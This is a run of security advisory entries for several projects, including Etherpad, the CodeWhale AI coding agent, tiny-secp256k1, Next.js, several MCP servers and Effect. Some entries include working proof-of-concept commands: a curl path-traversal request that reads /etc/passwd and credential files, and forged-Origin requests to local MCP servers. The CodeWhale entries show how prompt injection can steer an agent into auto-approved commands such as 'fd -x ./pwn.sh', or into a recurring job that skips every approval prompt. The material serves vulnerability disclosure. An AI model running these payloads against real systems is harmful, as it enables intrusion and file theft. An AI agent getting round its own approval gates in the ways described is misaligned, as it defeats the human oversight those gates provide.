items.title: [ep_etherpad-lite] Etherpad: Pre-auth arbitrary file read
items.summary: SummaryAn unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.DetailsEtherpad serves plugin static assets through src/node/utils/Minify.ts. The request path is first passed through the canonical sanitizer src/node/utils/sanitizePathname.ts, which is careful to convert backslashes to forward slashes only on Windows:// src/node/utils/sanitizePathname.ts:11-20p = pathApi.normalize(p);if (pathApi.isAbsolute(p)) throw new Error(`absolute paths are forbidden: ${p}`);if (p.split(pathApi.sep)[0] === '..') throw new Error(`directory traversal: ${p}`);// THIS CONVERSION MUST ONLY BE DONE ON WINDOWS, otherwise on POSIXish systems '..\\' in the input// pathname would not be normalized away before being converted to '../'.if (pathApi.sep === '\\') p = p.replace(/\\/g, '/');On Linux a backslash is an ordinary filename byte, so an input segment like ......\test contains no ./.. path components and passes every check in sanitizePathname unchanged. The project's own test suite confirms this: src/tests/backend-new/specs/sanitizePathname.ts:62 lists ['posix', '..\foo'] among the accepted paths (returned unchanged).The vulnerability is that Minify.ts then performs that Windows‑only conversion unconditionally, after the sanitizer has run, justified by a comment asserting the opposite of the invariant above:// src/node/utils/Minify.ts:171-186const match = filename.match(/^plugins\/([^/]+)(\/(?:(static\/.*)|.*))?$/);if (match) {const library = match[1];const libraryPath = match[2] || '';if (plugins.plugins[library] && match[3]) {const plugin = plugins.plugins[library];const pluginPath = plugin.package.realPath;      // for 'ep_etherpad-lite' == <root>/srcfilename = path.join(pluginPath, libraryPath);   // -> absolute path, backslashes preserved// ... "This conversion does not introduce a directory// traversal vulnerability because all '..\\' substrings have already been removed by// sanitizePathname."                              // <-- FALSE on POSIXfilename = filename.replace(/\\/g, '/');          // <-- reintroduces ../ AFTER the check}After line 186 the string becomes a real traversal (/src/static/../../../../etc/passwd) with no re‑normalization and no containment checkbefore the filesystem calls at Minify.ts:248 (fs.stat) and Minify.ts:315 (fs.readFile). Because path.join at line 179 produced an absolutepath, path.resolve(ROOT_DIR, filename) discards ROOT_DIR entirely, and POSIX path.resolve collapses surplus .. at /, so the payload is root‑depth‑agnostic.The route is reachable pre‑authentication. It is registered on the expressPreSession hook:// src/ep.json{ "name": "static", "hooks": { "expressPreSession": "ep_etherpad-lite/node/hooks/express/static" } }// src/node/hooks/express/static.ts:38app.all('/static/*filename', minify);and expressPreSession runs before the auth middleware:// src/node/hooks/express.ts:244-247await hooks.aCallAll('expressPreSession', {app, settings});   // static route registered hereapp.use(exports.sessionMiddleware);app.use(webaccess.checkAccess);                                // auth runs AFTERThe plugin branch is always taken because src/static/js/pluginfw/plugins.ts:153-158 unconditionally registers the core pseudo‑plugin ep_etherpad-lite with package.realPath = /src.Two decode facts make the exploit functional: Express 5 / path‑to‑regexp v8 decode wildcard params per segment, once ((v) =>  v.split('/').map(decodeURIComponent)), so req.params.filename.join('/') (Minify.ts:147) yields the once‑decoded path fed to the sanitizer, and %5C (encoded backslash) is the only working separator (%2F decodes to /, is re‑split, and is rejected by the split('/')[0] === '..' guard).PoCApplies to a default production deployment (no special configuration; works on Linux, e.g. the Docker image or a systemd source install). Replace TARGET:9001 with the instance.Read /etc/passwd (or any file) with no authentication. --path-as-is prevents the client from folding the traversal:curl --path-as-is \'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'Other high‑value reads (over‑shoot the .. depth; it is absorbed at /):admin password + secrets, root-agnostic via /proc/self/cwdcurl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..

items.title: [codewhale] CodeWhale: exec_shell parallel-readonly classifier auto-approves fd/rg/git grep exec flags enabling silent RCE
items.summary: Maintainer resolutionThe CodeWhale maintainers validated this report. CodeWhale 0.8.67 and earlier are affected. Version 0.9.0 contains the fix in commit 208421b9d23d81cea3311a1eeb2a2ea81d637686. Users should upgrade to 0.9.0 or later. The original reporter analysis is preserved below.SummaryThe interactive Agent profile of DeepSeek-TUI (CodeWhale) is explicitly documented to gate every shell command behind an approval prompt (config.rs:3725-3736). However, ExecShellTool::approval_requirement_for(&tool_input) downgrades the requirement from Required to Auto for any command the classifier deems "parallel read-only" (shell.rs:2314-2320). registered_tool_approval_required returns false for Auto before the auto_approve check runs (turn_loop.rs:37-38), so no prompt is shown even for a user who never enabled YOLO. The classifier is_parallel_readonly_command (command_safety.rs:389) rejects only shell metacharacters and then matches the flag-stripped base command name against an allowlist that includes fd, rg, and git grep. Those tools execute arbitrary external programs through documented flags (fd -x/--exec, rg --pre, git grep --open-files-in-pager) that need no shell metacharacters — yielding silent arbitrary-program execution in the default profile. Same silent-RCE class as CVE-2026-45311 (run_tests) but via a different, unpatched tool and code path.Root Causeapproval_requirement_for downgrades exec_shell to Auto when exec_shell_input_is_parallel_readonly returns true (shell.rs:2314-2320). The classifier strips all flags and matches the base command name against PARALLEL_READONLY_PREFIXES (command_safety.rs:363-385, 419-433). fd/rg are absent from COMMAND_ARITY, so fd -x cp {} /tmp/exfil canonicalizes to "fd" ∈ allowlist. The only remaining gate at the execute sink is analyze_command, which rates fd/rg as Safe (SAFE_COMMANDS command_safety.rs:527,530), so the SafetyLevel::Dangerous-only block (shell.rs:2408) never fires. Default execpolicy is empty (engine.rs:494) → Skip. Interactive-origin auto_review safety_floor holds only Publish (auto_review.rs:344-357), not interactive shell.ImpactArbitrary external program execution (any binary, any argv, including a repo-committed script) on the developer host, with no approval prompt, in the default interactive Agent profile — bypassing the boundary config.rs:3725-3736 explicitly promises. Identical outcome to seed CVE-2026-45311 via a different, unpatched tool.Proof of ConceptModel coerced (via indirect prompt injection from repo file / issue / fetched page — the seed threat model, in scope per SECURITY.md:48) to emit:{"name":"exec_shell","arguments":{"command":"fd -u -tf -x ./pwn.sh"}}Alternatives (all metachar-free, all auto-approved): fd -tf -x cp {} /tmp/exfil; rg --pre /tmp/evil.sh --pre-glob '*' needle .; git grep --open-files-in-pager=/tmp/evil.sh needle.Attack ChainEntry. Agent ingests attacker-controlled content; injected instruction coerces the model to emit exec_shell {"command":"fd -u -tf -x ./pwn.sh"}.Guard: none — reading content and model tool-calls are by design (seed threat model: indirect prompt injection).Bypass proof: n/a (in-scope by design per SECURITY.md:48).Gate — approval requirement. turn_loop.rs:1738 → spec.approval_requirement_for(&input) → shell.rs:2314-2320 exec_shell_input_is_parallel_readonly.Guard: metachar filter (command_safety.rs:394-400) + base-name allowlist.Bypass proof: the string contains none of ; & | > < \ $(or newlines;-x  isfd's own exec mechanism (no shell). classify_commandstrips-u -tf -x, positionals [fd, ./pwn.sh]; fd∉COMMAND_ARITY→ canonical"fd"∈PARALLEL_READONLY_PREFIXES→ returns true. Maintainer testparallel_readonly_command_classifier_is_strict(command_safety.rs:1162+) confirms barefd/rg` classify parallel-readonly.Gate — prompt decision. registered_tool_approval_required(name, Auto, auto_approve).Guard: the approval prompt itself.Bypass proof: requirement == Auto returns false at turn_loop.rs:37-38 unconditionally, before !auto_approve. No prompt regardless of user settings. Empty execpolicy → Skip; interactive safety_floor returns NoChange for fd.Sink. ExecShellTool::execute (shell.rs:2334) → analyze_command.Guard: SafetyLevel::Dangerous block (shell.rs:2408).Bypass proof: fd ∈ SAFE_COMMANDS (command_safety.rs:530) → analyze_command returns Safe; not Dangerous → not blocked. Child runs the attacker's program.Impact. Silent arbitrary-program execution on the developer host, no approval prompt, default interactive Agent profile.Bypass EvidencePresent on latest release tag v0.8.67: turn_loop.rs:37-38 Auto→return false; shell.rs:2314-2320 override; command_safety.rs allowlist includes "rg","fd","git grep"; SAFE_COMMANDS includes "rg","fd"; fd/rg absent from COMMAND_ARITY. command_safety.rs / turn_loop.rs finding-critical functions byte-identical v0.8.67↔HEAD.Maintainer's own test parallel_readonly_command_classifier_is_strict confirms bare rg/fd classify parallel-readonly and only metachar forms are rejected.Affected

items.title: [codewhale] CodeWhale: Automation auto_approve defaults to true, bypassing the task-path hardening fix for silent recurring agent execution
items.summary: Maintainer resolutionThe CodeWhale maintainers validated this report. CodeWhale 0.8.67 and earlier are affected. Version 0.9.0 contains the fix in commit 208421b9d23d81cea3311a1eeb2a2ea81d637686. Users should upgrade to 0.9.0 or later. The original reporter analysis is preserved below.SummaryCVE-2026-45374 (GHSA-72w5-pf8h-xfp4) hardened the task path so auto-approval must be opted into explicitly: add_task uses req.auto_approve.unwrap_or(false) (task_manager.rs:868). The automation subsystem was not hardened in kind. AutomationRecord::task_auto_approve() resolves an omitted auto_approve to DEFAULT_AUTOMATION_AUTO_APPROVE = true (automation_manager.rs:29, 101-103), and enqueue_run_task builds the NewTaskRequest with auto_approve: Some(automation.task_auto_approve()) — i.e. an explicit Some(true) (automation_manager.rs:766). Because the field is Some, unwrap_or(false) returns true and the seed-2 default is bypassed. That true propagates to ApprovalMode::Bypass (runtime_threads.rs:2253), where the background approval loop auto-approves every tool call with no human present (runtime_threads.rs:3383-3416). One approved automation_create becomes a durable, recurring, fully auto-approved agent. Same insecure-default class as CVE-2026-45374, on a different, unpatched subsystem.Root CauseSibling durable defaults in the same struct are safe — DEFAULT_AUTOMATION_ALLOW_SHELL = false and DEFAULT_AUTOMATION_TRUST_MODE = false (automation_manager.rs:27-28) — while DEFAULT_AUTOMATION_AUTO_APPROVE alone defaults true (:29). create_automation stores auto_approve: None when omitted (:422); task_auto_approve() resolves None→true (:101-103); enqueue_run_task passes Some(true) (:766), defeating add_task's unwrap_or(false) seed fix. The automation_create tool schema also declares "auto_approve": {"type":"boolean","default":true} (tools/automation.rs:49) while sibling allow_shell/trust_mode default false.ImpactA single approved automation_create yields a durable, recurring, fully auto-approved agent. Every scheduled fire silently authorizes mutating tools (file writes, apply_patch, git, MCP writes) with no prompt; combined with allow_shell:true in the create call, recurring silent RCE with no human present. Even without allow_shell, every recurring run silently authorizes all non-shell mutating tools. Same class as seed CVE-2026-45374.Proof of ConceptPrompt injection convinces the model to create a benign-sounding recurring job (single human approval on the automation_create call):{"name":"automation_create","arguments":{  "name":"nightly-maintenance",  "prompt":"Fetch latest and run project setup script",  "rrule":"FREQ=HOURLY;INTERVAL=1",  "allow_shell":true}}(auto_approve omitted → stored None → resolves to true on every run.)Attack ChainEntry. Prompt injection → model creates a recurring job via automation_create with auto_approve omitted.Guard: automation_create is Required (tools/automation.rs:61-63) — user sees ONE approval prompt.Bypass proof: the prompt describes an innocuous automation; the schema hides "auto_approve": {"default": true} (tools/automation.rs:49). Approving "create a scheduled job" is not informed consent to "every future run bypasses all approval prompts." The resolved auto_approve=true (omitted field) is not surfaced.Persist. create_automation stores auto_approve: None (automation_manager.rs:422).Guard: none.Bypass proof: None is later resolved to true, not false.Fire. Headless scheduler tick (scheduler_tick_shared, no human) or automation_run invokes enqueue_run_task, which sets auto_approve: Some(true) (automation_manager.rs:766).Guard: seed-2's hardened add_task default unwrap_or(false) (task_manager.rs:868).Bypass proof: the value is Some(true), so unwrap_or(false) yields true — the hardened default never applies.Sink. Background worker builds the turn with auto_approve=true → ApprovalMode::Bypass (runtime_threads.rs:2253); the approval loop auto-approves (runtime_threads.rs:3383-3416).Guard: auto_review safety_floor.Bypass proof: safety_floor holds only Publish (any origin) and Destructive/Secret (background/headless) (auto_review.rs:344-357); ordinary write_file/apply_patch/edit_file/non-destructive exec_shell are NOT held → they run unattended. With allow_shell:true, every scheduled run additionally gets silent shell execution.Impact. Durable, recurring, fully auto-approved agent from one create approval; recurring silent RCE with allow_shell:true.Bypass EvidencePresent on latest release tag v0.8.67: automation_manager.rs:27-29 (ALLOW_SHELL=false, TRUST_MODE=false, AUTO_APPROVE=true), :101-103 task_auto_approve()→unwrap_or(true), :766 Some(automation.task_auto_approve()), :422 stores None when omitted; task_manager.rs:868 unwrap_or(false); runtime_threads.rs:2253 if auto_approve → ApprovalMode::Bypass. automation_manager.rs and task_manager.rs byte-identical v0.8.67↔HEAD.Subsystem wired by default: automation_create/automation_run registered via with_runtime_task_tools() in with_agent_tools_policy

items.title: [tiny-secp256k1] tiny-secp256k1: Stale buffer after ignored wasm failure accepts invalid infinity tweak
items.summary: SummaryThe three-argument xOnlyPointAddTweakCheck path ignores the wasm failure return and compares an unchanged input buffer. When the tweak result is the point at infinity, this stale-buffer comparison can return true for an invalid derivation.DetailsxOnlyPointAddTweakCheck in index.ts has two code paths. The path taken when the caller omits tweakParity discards the return value of the wasm call and compares whatever the shared input buffer holds.try {    X_ONLY_PUBLIC_KEY_INPUT.set(point);    X_ONLY_PUBLIC_KEY_INPUT2.set(resultToCheck);    TWEAK_INPUT.set(tweak);    if (hasParity) {      return wasm.xOnlyPointAddTweakCheck(tweakParity) === 1;    } else {      wasm.xOnlyPointAddTweak();      const newKey = X_ONLY_PUBLIC_KEY_INPUT.slice(        0,        validate.X_ONLY_PUBLIC_KEY_SIZE      );      return compare(newKey, resultToCheck) === 0;    }x_only_point_add_tweak in lib.rs returns -1 and leaves X_ONLY_PUBLIC_KEY_INPUT untouched when the tweak addition fails.pub extern "C" fn x_only_point_add_tweak() -> i32 {    unsafe {        let mut xonly_pk = jstry!(x_only_pubkey_parse(X_ONLY_PUBLIC_KEY_INPUT.as_ptr()), 0);        let mut pubkey = PublicKey::new();        if secp256k1_xonly_pubkey_tweak_add(            get_context(),            &mut pubkey,            &xonly_pk,            TWEAK_INPUT.as_ptr(),        ) != 1        {            // infinity point            return -1;        }The buffer still holds point, which the caller wrote immediately before the call. newKey therefore equals point, and the comparison against resultToCheck succeeds whenever the caller passes resultToCheck equal to point.secp256k1_xonly_pubkey_tweak_add in upstream main_impl.h returns 0 only when the internal key fails to load or the tweak helper fails.if (!secp256k1_xonly_pubkey_load(ctx, &pk, internal_pubkey)    || !secp256k1_ec_pubkey_tweak_add_helper(&pk, tweak32)) {    return 0;}The helper in secp256k1.c fails on scalar overflow or on an infinite result.static int secp256k1_ec_pubkey_tweak_add_helper(secp256k1_ge *p, const unsigned char *tweak32) {    secp256k1_scalar term;    int overflow = 0;    secp256k1_scalar_set_b32(&term, tweak32, &overflow);    return !overflow && secp256k1_eckey_pubkey_tweak_add(p, &term);}validateTweak in validate.ts already rejects a tweak at or above the group order, so overflow is excluded and the only remaining cause is lift_x(point) + tweak * G reaching the point at infinity.The parity path is correct for the same input. secp256k1_xonly_pubkey_tweak_add_check returns 0 in that case. The two documented forms of the same check disagree.xOnlyPointAddTweak also disagrees with the check, returning null for the exact inputs the check accepts.The condition is untested. schnorr.js skips every xOnlyPointAddTweakCheck assertion for the infinity vectors present in its own fixtures.const res = secp256k1.xOnlyPointAddTweak(f.pubkey, f.tweak);if (f.result === null) {  t.same(res, f.result, `xOnlyPointAddTweak returns null when G pubkey and n - 1 tweak used`);  continue;}PoCBoth witnesses are already present in the project fixtures at schnorr.json as the two vectors with a null result, and both pass every validator in validate.ts.import * as secp256k1 from "tiny-secp256k1";const hex = (s) => Uint8Array.from(Buffer.from(s, "hex"));// x coordinate of G, and the tweak n - 1const point = hex("79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798");const tweak = hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140");// lift_x(point) + tweak * G is the point at infinity, no tweaked key existsconsole.log(secp256k1.xOnlyPointAddTweak(point, tweak));// nullconsole.log(secp256k1.xOnlyPointAddTweakCheck(point, tweak, point, 0));// false   correct, the parity form uses the C checkconsole.log(secp256k1.xOnlyPointAddTweakCheck(point, tweak, point));// true    wrong, the three argument form compares point against itselfA second witness from the same fixture uses the x coordinate of 2 * G with tweak n - 2.const point2 = hex("c6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee5");const tweak2 = hex("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd036413f");console.log(secp256k1.xOnlyPointAddTweakCheck(point2, tweak2, point2));   // trueBoth were executed against the published secp256k1.wasm from npm 2.2.4 under wasmtime, driving the exports through the exact write, call, slice, zero sequence index.ts performs.-- witness x(G), n-1   xOnlyPointAddTweak(P, t)      = None   check(P, t, P, parity=0)      = False   check(P, t, P, parity=1)      = False   check(P, t, P)   3-arg form   = True   raw wasm return               = -1   buffer after call unchanged   = True 79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798-- witness x(2G), n-2   xOnlyPointAddTweak(P, t)      = None   check(P, t, P, parity=0)      = False   check(P, t, P, parity=1)      = False   check(P, t, P)   3-arg form   = True   raw wasm return               = -1   buffer after call unchanged   = True c6

items.title: [next] Next.js: SVG rejection bypass in the image optimization
items.summary: On self-hosted deployments, the Next.js image optimizer (/_next/image) can be made to process an attacker-supplied SVG even when SVG support is disabled with dangerouslyAllowSVG: false (the default). This reaches an SVG parser the application intended to keep disabled, increasing exposure to denial of service and SVG decoder vulnerabilities.Referenceshttps://github.com/vercel/next.js/security/advisories/GHSA-7qx7-33qx-rqx2https://nvd.nist.gov/vuln/detail/CVE-2026-119347https://github.com/vercel/next.js/commit/4f133352e639589ad9872b9b55307b89b258e41bhttps://github.com/vercel/next.js/commit/e66e656e7d423a828bdca5f87e82cef7038c57a6https://github.com/vercel/next.js/releases/tag/v15.5.29https://github.com/vercel/next.js/releases/tag/v16.4.5https://nextjs.org/blog/november-2026-security-releasehttps://github.com/advisories/GHSA-7qx7-33qx-rqx2

items.title: [next] Next.js: HttpOnly cookie exposure through internal response header on Next.js Edge runtime routes
items.summary: Next.js applications that set cookies through NextResponse on Edge runtime routes — App Router route handlers and Pages Router Edge API routes — send an internal x-middleware-set-cookie header in the public response, duplicating the cookie value and its attributes. This makes HttpOnly cookies, such as session tokens, readable by JavaScript running on the same origin when an application sets a sensitive cookie on an affected response.Referenceshttps://github.com/vercel/next.js/security/advisories/GHSA-f3mh-rxg3-f5g2https://nvd.nist.gov/vuln/detail/CVE-2026-119346https://github.com/vercel/next.js/commit/809be725f033ec7aa4c658ba2b7a084cb039d1f2https://github.com/vercel/next.js/commit/9fc04bd869ded4900bed7d069832aa2c5f56fa29https://github.com/vercel/next.js/releases/tag/v15.5.29https://github.com/vercel/next.js/releases/tag/v16.4.5https://nextjs.org/blog/november-2026-security-releasehttps://github.com/advisories/GHSA-f3mh-rxg3-f5g2

items.title: [next] Next.js: Cross-client response injection and disclosure in self-hosted Next.js applications forwarding fetched responses
items.summary: Self-hosted Next.js applications (App Router route handlers and the fetch cache) that return a fetched upstream response unchanged can emit a response whose declared framing does not match the body actually sent. When such an application sits behind an HTTP/1.1 reverse proxy that permits pipelined response queueing, a crafted upstream response can desynchronize responses between clients, enabling response injection and disclosure of other clients' responses.Referenceshttps://github.com/vercel/next.js/security/advisories/GHSA-pc58-hwjq-p385https://nvd.nist.gov/vuln/detail/CVE-2026-119348https://github.com/vercel/next.js/commit/2842833be3a5a1e5fef0c5fb8c96df74742eef2ahttps://github.com/vercel/next.js/commit/848ec29a3fbe68c02edb022efe19b04356997c32https://github.com/vercel/next.js/releases/tag/v15.5.29https://github.com/vercel/next.js/releases/tag/v16.4.5https://nextjs.org/blog/november-2026-security-releasehttps://github.com/advisories/GHSA-pc58-hwjq-p385

items.title: [next] Next.js: Cross-user cache disclosure and poisoning in Next.js use cache with binary arguments
items.summary: Next.js App Router applications that pass binary arguments (such as Uint8Array or Blob values) to functions using the use cache directive can produce identical cache keys for distinct arguments, allowing cached results to be shared across users — cross-user disclosure of cached data or cache poisoning. This affects applications using use cache with binary arguments.Referenceshttps://github.com/vercel/next.js/security/advisories/GHSA-rhh4-g77r-r9qjhttps://nvd.nist.gov/vuln/detail/CVE-2026-119349https://github.com/vercel/next.js/commit/6596840a0fa3c2633735b05e41ca3d9ab01ece41https://github.com/vercel/next.js/releases/tag/v16.4.5https://nextjs.org/blog/november-2026-security-releasehttps://github.com/advisories/GHSA-rhh4-g77r-r9qj

items.title: [next] Next.js: Cache poisoning of shared fallback shells in Cache Components via request-supplied placeholder route params
items.summary: Self-hosted Next.js applications served with next start and built with cacheComponents: true but without Partial Prefetching accept a request-supplied route param value as a prerender placeholder. One unauthenticated GET request can poison the fallback shell cache entry that a family of routes shares.Such a route is served from a shell that keeps its never-prerenderable params as placeholders, so every value of those params shares one cache entry. A path segment equal to the percent-encoded, bracketed name of its own route param is treated as an unresolved placeholder, and only that param is deferred. A layout above it then renders its concrete value into the shell during the blocking render, and the result, including its HTTP status, is stored under the shared key.Depending on the application, the stored entry is one of the following:A persistent 404, when the layout rejects the value with notFound(): served to every URL under the shell key with "revalidate": false, across server restarts, with no error logged.A substituted param value, when the layout renders the value: the server-rendered HTML renders the attacker's value for that param in place of the visitor's own. A JavaScript client corrects it on hydration. No markup or script injection is possible, and no data is disclosed.PreconditionscacheComponents: true with partialPrefetching unset or false.Self-hosted serving with next start.A dynamic route with a prerenderable param (generateStaticParams) whose requested value was not generated at build time.At least two never-prerenderable params below it: a layout reading the shallower one inside a Suspense boundary, and a deeper one the request supplies as the placeholder.A blocking fallback shell.WorkaroundsSet partialPrefetching: true in next.config. Otherwise, apps should upgrade to the patched version as soon as possible.Referenceshttps://github.com/vercel/next.js/security/advisories/GHSA-vvgp-ww4w-46vfhttps://nvd.nist.gov/vuln/detail/CVE-2026-119350https://github.com/vercel/next.js/commit/18eeffb5fabd91911852d44cf56948b3f2cbee04https://github.com/vercel/next.js/releases/tag/v16.4.5https://nextjs.org/blog/november-2026-security-releasehttps://github.com/advisories/GHSA-vvgp-ww4w-46vf

items.title: [safari-mcp] Safari MCP: JavaScript injection through single-quoted tool arguments (backslash not escaped)
items.summary: ImpactSixteen places in safari.js placed a tool argument inside a single-quoted JavaScript string literal and escaped the single quote without first escaping backslashes. An argument containing a backslash followed by a quote therefore closed the literal, and the rest of the argument ran as JavaScript in the page.Seven of the affected arguments belong to read-only tools that are exempt from the tab-ownership check: filter in safari_network_details and safari_extract_links, level in safari_console_filter, selector in safari_snapshot, safari_accessibility_snapshot and safari_extract_tables, and dbName / storeName in safari_get_indexed_db. An MCP client limited to read-only tools (with safari_evaluate and safari_run_script excluded from its allowlist) could still run arbitrary page JavaScript through them, including in a tab the session does not own. The other affected arguments are ref in safari_select_option, safari_react_select_set and safari_react_select_list_options, the key in safari_press_key, the file name in safari_upload_file and safari_paste_image, and the first line of the text in safari_replace_editor.PatchesFixed in 2.22.15: every affected site uses the shared escJsSingleQuote, which escapes the backslash before the quote, and a test fails the build if a quote-only escape returns.WorkaroundsUpgrade to 2.22.15. There is no configuration workaround: excluding safari_evaluate and safari_run_script from a client's tool list did not prevent the injection.CreditsReported privately on 2026-10-09 by Aliaksandr Palei (@fakepooh) under the coordinated-disclosure process in SECURITY.md.Referenceshttps://github.com/achiya-automation/safari-mcp/security/advisories/GHSA-4rj4-rcrq-gr92https://github.com/achiya-automation/safari-mcp/commit/23f1319defefd2c5cbd06b23189ab01876a8c5d3https://github.com/achiya-automation/safari-mcp/releases/tag/v2.22.15https://github.com/advisories/GHSA-4rj4-rcrq-gr92

items.title: [effect] Effect: ReDoS in Schema.TemplateLiteral compiled regex
items.summary: ImpactSchema.TemplateLiteral compiles each Schema.String span to the lazy wildcard [\s\S]*? and decodes input by running the resulting regular expression against it. When a template has two or more Schema.String spans, for example:Schema.TemplateLiteral(Schema.String, ":", Schema.String, ":", Schema.String, "X")the regex contains several ambiguous wildcards. A non-matching input makes the backtracking engine try combinations across all of them, so matching time grows cubically with input length. A 5,000-character string of : characters blocks the event loop for about 15 seconds.Applications that decode untrusted input with such a schema are affected. That includes Schema.decodeUnknown, Schema.decodeUnknownSync and Schema.is, and anything built on them, such as HttpApi request payloads and @effect/rpc payloads.PatchesFixed in effect@3.22.1 (#6761). Template literals whose spans are all Schema.String are now matched with a linear left-to-right scan instead of a regular expression.WorkaroundsIf you can't upgrade, check the input length before the template literal runs. Adding Schema.maxLength with .pipe doesn't help, because the filter runs after the regex. Put the length check on the input side instead:Schema.compose(Schema.String.pipe(Schema.maxLength(256)), MyTemplateLiteral)Rejecting oversized request bodies before they reach the schema also works.Referenceshttps://github.com/Effect-TS/effect/security/advisories/GHSA-7589-6fvf-x4pwhttps://nvd.nist.gov/vuln/detail/CVE-2026-121707https://github.com/Effect-TS/effect/pull/6761https://github.com/Effect-TS/effect/commit/3cc3c6e1a64cbdc360e9d28e44f3ec3ce0ece6e3https://github.com/Effect-TS/effect/releases/tag/effect@3.22.1https://github.com/advisories/GHSA-7589-6fvf-x4pw

items.title: [obsidian-sync-mcp] obsidian-sync-mcp: Missing Host/Origin validation lets a public website drive a victim's Obsidian vault via DNS rebinding (no-auth mode)
items.summary: When obsidian-sync-mcp runs without MCP_AUTH_TOKEN (the documented no-auth mode for local use), the HTTP MCP endpoint does not validate the Host or Origin header before dispatching MCP methods (CWE-350). The no-auth mode's "local network only" assumption therefore does not hold: a malicious web page the operator visits can use DNS rebinding to resolve an attacker-controlled hostname to 127.0.0.1 (or the operator's LAN/VPN/Docker-published address) and issue requests the server accepts as trusted local calls, reaching the full tool surface (read_note, write_note, edit_note, delete_note, move_note, list_notes, list_folders, list_tags, get_note_metadata).Affected versions: <= 0.5.6Patched version: 0.5.7ImpactAny deployment running without MCP_AUTH_TOKEN — including the README "Filesystem mode (simplest)" quickstart and the self-hosted docker-compose setup (where MCP_AUTH_TOKEN defaults to empty)" — is exposed to any website the operator visits while the server is running. That page's JavaScript can silently read the entire vault and create/overwrite/delete/move notes, with no credentials and no prompt. In CouchDB/Self-hosted LiveSync mode, the same code path applies, so vault content in CouchDB is equally reachable. Deployments that set MCP_AUTH_TOKEN are not affected — a bearer token is not attached by browsers, so a forged request returns HTTP 401.RemediationUpgrade to 0.5.7, which validates both the Host and Origin headers in no-auth mode: any request whose Host is not localhost/127.0.0.1/::1 (or a value in the new MCP_ALLOWED_HOSTS), or that carries a cross-origin Origin not in that allowlist, is rejected before any MCP method runs. The Host check defeats DNS rebinding; the Origin check defeats the related bypass where a page directly fetches http://127.0.0.1:/mcp (genuine loopback Host, attacker Origin) — the transport's wildcard CORS would otherwise expose the response. Non-browser MCP clients send no Origin, so they are unaffected. These checks block browser-delivered attacks only; a direct non-browser network client can still forge both headers, so on untrusted networks set MCP_AUTH_TOKEN.Workaround (any version): set MCP_AUTH_TOKEN to require authentication — this closes the path immediately.Technical detailIn no-auth mode serverOptions.authenticate was never installed, so FastMCP dispatched every request with no per-request check. Even with a token, only the Authorization header was inspected — nothing in the server, fastmcp, or mcp-proxy validated Host/Origin. Two browser-reachable variants follow: (1) classic DNS rebinding, where the browser sends the attacker's hostname in Host; and (2) a direct cross-origin fetch() to the loopback address, where Host is genuinely 127.0.0.1 but Origin is attacker-controlled and the transport's wildcard Access-Control-Allow-Origin: * exposes the response — no rebinding required. The 0.5.7 fix adds an application-layer Host+Origin check in authenticate that rejects such requests before dispatch; it is a compensating control and does not alter the wildcard CORS header itself (the rejection happens before any response body is produced).Proof of concept (mitigated in 0.5.7)# No-auth server (per the README quickstart)VAULT_PATH=/tmp/demo-vault HOST=127.0.0.1 PORT=8787 npx tsx src/main.ts# Forged Host/Origin (what a DNS-rebinding page's fetch() sends) reaches the tools with no credential:curl -s -i http://127.0.0.1:8787/mcp \  -H "Host: attacker.example" -H "Origin: http://attacker.example" \  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'# -> HTTP 200; a follow-up tools/call to write_note creates a file in the vault, no Authorization header.# The same sequence against a server with MCP_AUTH_TOKEN set returns HTTP 401.# Variant 2 — no rebinding needed: real loopback Host, attacker Origin.# In <= 0.5.6 this returns 200 and executes tools; in 0.5.7 it returns 403.curl -s -i http://127.0.0.1:8787/mcp \  -H "Host: 127.0.0.1:8787" -H "Origin: http://attacker.example" \  -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" \  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"1.0"}}}'Referenceshttps://github.com/es617/obsidian-sync-mcp/security/advisories/GHSA-mx6p-3fg7-v6pjhttps://nvd.nist.gov/vuln/detail/CVE-2026-77283https://github.com/es617/obsidian-sync-mcp/commit/d4d2cbbb02ffadaecf1d6252902b8d08610c7018https://github.com/es617/obsidian-sync-mcp/releases/tag/v0.5.7https://github.com/advisories/GHSA-mx6p-3fg7-v6pj

items.title: [@doist/todoist-mcp] Todoist MCP Server: Browser DNS rebinding lets websites write and delete Todoist data through local MCP server
